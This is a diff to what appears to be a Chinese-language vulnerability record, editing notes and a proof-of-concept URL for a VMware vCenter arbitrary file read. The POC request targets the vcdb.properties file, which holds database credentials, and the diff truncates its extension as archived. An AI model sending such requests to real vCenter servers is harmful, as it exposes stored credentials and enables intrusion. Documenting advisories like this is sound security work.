@@ -29,7 +29,7 @@ schema_version: "1"
 
 ### 本次正文校订
 
-- 修复请求中文件扩展名截断。
+- 原请求按归档保留 vcdb.properti；文件扩展名可能截断，vcdb.properties 的校订意见置于原请求之外。
 
 ### 尚未解决的证据缺口
 
@@ -56,5 +56,5 @@ schema_version: "1"
 ***\*POC\**:**
 
 ```
-http://x.x.x.x/eam/vib?id=c:\programData\Vmware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+http://x.x.x.x/eam/vib?id=c:\programData\Vmware\vCenterServer\cfg\vmware-vpx\vcdb.properti
 ```
